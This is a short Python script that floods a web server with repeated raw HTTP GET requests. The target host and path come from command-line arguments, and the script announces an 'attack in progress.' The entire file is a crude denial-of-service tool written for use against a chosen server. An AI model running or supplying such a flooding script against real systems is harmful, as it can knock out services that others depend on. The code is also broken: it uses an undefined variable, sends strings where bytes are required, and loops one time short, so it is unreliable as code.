#use socket to communicate with web server

import socket, sys, os


def attackServer(traffic):

    #this connects with the server
    #pid = os.fork()
    serverr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #set your ipaddress target in the command line call or else this line will fail  
    serverr.connect((sys.argv[1], 80))   
    
    #this sends the requests, have your second section of call apache or similar
    print (">> GET /" + sys.argv[2] + " HTTP/1.1")
    serverr.send("GET /" + sys.argv[2] + " HTTP/1.1\r\n")   
    serverr.send("Host: " + sys.argv[1]  + "\r\n\r\n"); 
    
    print ("Now sending"+ str(n)+ "requests: " + sys.argv[2]) 

    serverr.close()   

  
traffic= int(input("# of request"))

#runs n many times based on traffic initilization
print ("Attack in progress on: " + sys.argv[1])


for i in range(1, traffic):   
    try:
        attackServer(traffic)
    except:
        print("failure to connect")  
